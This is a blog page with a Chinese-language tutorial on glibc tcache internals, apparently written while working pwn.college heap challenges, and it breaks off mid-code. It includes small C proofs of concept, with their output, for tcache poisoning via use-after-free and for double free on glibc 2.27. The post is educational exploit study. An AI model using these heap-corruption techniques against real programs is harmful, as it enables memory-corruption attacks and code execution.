<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Cascadia Code:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"deutschball.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"万一找到了呢","hits_empty":"你说的 ${query} 我怎么找不着呢 ","hits_stats":"找到了 ${hits} 个结果，用时 ${time} 毫秒"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="dustland">
<meta property="og:type" content="website">
<meta property="og:title" content="dustland">
<meta property="og:url" content="http://deutschball.github.io/impossible/index.html">
<meta property="og:site_name" content="dustland">
<meta property="og:description" content="dustland">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="dustball">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://deutschball.github.io/impossible/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>dustland</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">dustland</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">dustball in dustland</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container"></div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="algolia-results">
  <div id="algolia-stats"></div>
  <div id="algolia-hits"></div>
  <div id="algolia-pagination" class="algolia-pagination"></div>
</div>

      
    </div>
  </div>

</div>
    </header>

    
  <div class="reading-progress-bar"></div>

  <a href="https://github.com/deutschball" class="github-corner" title="Follow me on GayHub" aria-label="Follow me on GayHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/10/17/T%E6%93%A6%E8%BD%A6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/10/17/T%E6%93%A6%E8%BD%A6/" class="post-title-link" itemprop="url">tcache</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2024-10-17 23:24:00 / Modified: 23:24:35" itemprop="dateCreated datePublished" datetime="2024-10-17T23:24:00+08:00">2024-10-17</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="t擦车">T擦车</h1>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -o ProxyCommand=&quot;ncat  --proxy-type socks5 --proxy 127.0.0.1:7891 %h %p&quot; hacker@pwn.college</span><br><span class="line">scp -o ProxyCommand=&quot;ncat  --proxy-type socks5 --proxy 127.0.0.1:7891 %h %p&quot; hacker@pwn.college:/challenge/babyheap_level15.0  .</span><br></pre></td></tr></table></figure>
<h2 id="tcache数据结构与算法">tcache数据结构与算法</h2>
<h3 id="glibc-2.27">glibc-2.27</h3>
<h4 id="datastructure">datastructure</h4>
<p>在<code>glibc-2.27</code>上<code>Tcache</code>长这样</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241009161233717.png"
alt="image-20241009161233717" />
<figcaption aria-hidden="true">image-20241009161233717</figcaption>
</figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">//每个线程有一个tcache,因此tcache的线程实例名叫tcache_perthread_struct</span></span><br><span class="line"><span class="comment">//counts和entries是冗余的,只是为了性能所以使用了counts计数</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"><span class="comment">//每个tcache有TCACHE_MAX_BINS = 64 个桶子</span></span><br></pre></td></tr></table></figure>
<p>显然每个桶子里面的<code>chunk</code>大小不一样,并且和桶子下标<code>idx</code>有映射关系,具体来说是:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk size convert to tcache index:</span><br><span class="line">csize2tidx(csize) = (csize<span class="number">-0x11</span>) &gt;&gt; <span class="number">4</span> </span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>tcache下标</th>
<th>chunk_size</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>0x20</td>
</tr>
<tr>
<td>1</td>
<td>0x30</td>
</tr>
<tr>
<td>2</td>
<td>0x40</td>
</tr>
<tr>
<td>…</td>
<td></td>
</tr>
</tbody>
</table>
<blockquote>
<p>在<code>amd64</code>上</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SIZE_SZ = <span class="number">0x8</span></span><br><span class="line">MALLOC_ALIGNMENT = <span class="number">0x10</span></span><br><span class="line">MINSIZE = <span class="number">0x20</span></span><br><span class="line">MIN_CHUNK_SIZE = <span class="number">0x20</span></span><br><span class="line">MALLOC_ALIGN_MASK = <span class="number">0xf</span></span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="algorithm">algorithm</h4>
<h5 id="malloc">malloc</h5>
<p><code>glibc</code>在<code>2.26</code>之后,
引入了<code>TCACHE</code>机制</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">malloc =&gt; __libc_malloc</span><br><span class="line">	tcache_get</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc(<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">    <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">    <span class="type">size_t</span> tbytes;</span><br><span class="line">    checked_request2size(bytes, tbytes);</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx(tbytes);		<span class="comment">//计算tcache桶下标</span></span><br><span class="line"></span><br><span class="line">    MAYBE_INIT_TCACHE();</span><br><span class="line"></span><br><span class="line">    DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">    <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins			<span class="comment">//下标最高是TCACHE_MAX_BINS = 64</span></span><br><span class="line">        <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">        &amp;&amp; tcache &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)	<span class="comment">//tc_idx下标桶子里至少有一个堆块</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> tcache_get(tc_idx);	<span class="comment">//从桶子里拿一个堆块返回</span></span><br><span class="line">    &#125;</span><br><span class="line">    DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>没有任何嵌套, 零帧起手</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];		<span class="comment">//FIFO栈</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);				<span class="comment">//再确保一下没有越界</span></span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);				<span class="comment">//再确保一下至少有一个堆块</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;				<span class="comment">//下一个块成为头块</span></span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);						<span class="comment">//块计数-1</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;								<span class="comment">//返回堆块</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>整个过程中<code>tcache-&gt;counts[tc_idx]</code>只是随手一记录,并没有根据其值判断是否还有堆块</p>
<p>真正的判断是根据桶子头指针是否为空决定的</p>
<p>当一个堆块返回到<code>tcache</code>中时, 如果可以<code>UAF</code>,
那么就可以把任意假的堆块塞进去</p>
<p>写个poc意思一下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> *chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">size_t</span> *fake_chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">size_t</span> *fake_chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">size_t</span> *chunk2;</span><br><span class="line">    <span class="type">size_t</span> *chunk3;</span><br><span class="line">    <span class="type">size_t</span> *chunk4;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    chunk1[<span class="number">0</span>] = fake_chunk1;        <span class="comment">//UAF , chunk1 link fake_chunk1 into tcache</span></span><br><span class="line">    fake_chunk1[<span class="number">0</span>] = fake_chunk2;   <span class="comment">//fake_chunk1 link fake_chunk2 into tcache</span></span><br><span class="line"></span><br><span class="line">    chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);          <span class="comment">//previous chunk1</span></span><br><span class="line">    chunk3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);          <span class="comment">//previous fake_chunk1</span></span><br><span class="line">    chunk4 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);          <span class="comment">//previous fake_chunk2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake_chunk1: %p\n&quot;</span>, fake_chunk1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake_chunk2: %p\n&quot;</span>, fake_chunk2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk2: %p\n&quot;</span>, chunk2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk3: %p\n&quot;</span>, chunk3);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk4: %p\n&quot;</span>, chunk4);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test<span class="meta"># gcc 227.c -o 227 -no-pie -g -O0 -w</span></span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# ./<span class="number">227</span></span><br><span class="line">fake_chunk1: <span class="number">0x24dd280</span></span><br><span class="line">fake_chunk2: <span class="number">0x24dd2a0</span></span><br><span class="line">chunk2: <span class="number">0x24dd260</span></span><br><span class="line">chunk3: <span class="number">0x24dd280</span></span><br><span class="line">chunk4: <span class="number">0x24dd2a0</span></span><br></pre></td></tr></table></figure>
<p>并且调试观察当<code>chunk2 = malloc(0x10);</code>之后<code>tcache-&gt;count[tc_idx] = 0</code></p>
<p>接着当<code>chunk3 = malloc(0x10);</code>之后,<code>tcache-&gt;count[tc_idx] = 255</code>,发生了整数下溢</p>
<p>只能说<code>glibc-2.27</code>上的<code>tcache</code>是很简陋的</p>
<h5 id="free">free</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free =&gt; __libc_free</span><br><span class="line">	_int_free</span><br><span class="line">		tcache_put</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_int_free(mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">    INTERNAL_SIZE_T size;     <span class="comment">/* its size */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    size = chunksize(p);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">size_t</span> tc_idx = csize2tidx(size);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">        &#123;	<span class="comment">//放回堆块到tcache时根据counts决定对应桶是否已经存满</span></span><br><span class="line">            tcache_put(p, tc_idx);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p><code>tcache-&gt;counts[tc_idx]</code>终于发挥作用了,原来是不想遍历链表统计堆块个数,直接看<code>counts</code>偷懒</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>free</code>时根本没有检查,
甚至名目仗胆的<code>double free</code>都没事,
写个<code>poc</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> * chunk = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk);</span><br><span class="line">    <span class="built_in">free</span>(chunk);<span class="comment">//就是明目张胆double free</span></span><br><span class="line">    <span class="type">char</span> *chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);    </span><br><span class="line">    <span class="type">char</span> *chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk1 @ %p\n&quot;</span>,chunk1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk2 @ %p\n&quot;</span>,chunk2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test<span class="meta"># ldd 227_df</span></span><br><span class="line">        linux-vdso.so<span class="number">.1</span> (<span class="number">0x00007fff22cdd000</span>)</span><br><span class="line">        libc.so<span class="number">.6</span> =&gt; /home/dustball/glibc/glibc<span class="number">-2.27</span>/lib/libc.so<span class="number">.6</span> (<span class="number">0x00007f9b9aab4000</span>)</span><br><span class="line">        /home/dustball/glibc/glibc<span class="number">-2.27</span>/lib/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> =&gt; /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007f9b9ae68000</span>)</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# ./<span class="number">227</span>_df</span><br><span class="line">chunk1 @ <span class="number">0xf6d260</span></span><br><span class="line">chunk2 @ <span class="number">0xf6d260</span></span><br></pre></td></tr></table></figure>
<h3 id="glibc-2.31">glibc-2.31</h3>
<h4 id="datastructure-1">datastructure</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span>			<span class="comment">//如果key等于glibc既定key值说明本堆块是已经被释放的</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">    tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>
<p><code>glibc-2.29</code>之后,
<code>tcache_entry</code>结构中加入了一个key字段,
当使用<code>tcache_put</code>把堆块挂到<code>tcache</code>中时,
其<code>key</code>字段均被设置为<code>tcache</code>的地址</p>
<p>以<code>glibc-2.31</code>为例</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="algorithm-1">algorithm</h4>
<h5 id="malloc-1">malloc</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span> =&gt; __libc_malloc</span><br><span class="line">	tcache_get</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc(<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">    <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">    <span class="type">size_t</span> tbytes;</span><br><span class="line">    <span class="keyword">if</span> (!checked_request2size(bytes, &amp;tbytes))</span><br><span class="line">    &#123;</span><br><span class="line">        __set_errno(ENOMEM);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span 